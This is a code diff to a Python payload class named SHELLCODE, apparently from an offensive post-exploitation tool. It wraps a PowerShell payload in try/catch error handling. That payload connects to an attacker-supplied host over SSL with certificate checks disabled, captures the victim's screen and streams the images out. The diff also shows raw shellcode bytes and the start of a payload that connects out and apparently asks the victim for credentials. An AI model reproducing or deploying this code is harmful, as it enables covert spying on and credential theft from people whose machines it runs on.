@@ -156,7 +156,8 @@ class SHELLCODE(object):
         "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")
 
     windows_ps_rev_watch_screen = (
-        "Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
+
+        "Try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
         "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
         "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
         "$ssl.AuthenticateAsClient($env:computername);function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
@@ -169,7 +170,7 @@ class SHELLCODE(object):
         "$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
         "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
         "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
-        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()")
+        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()}catch{Exit}")
 
     windows_ps_ask_creds_tcp = (
         "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
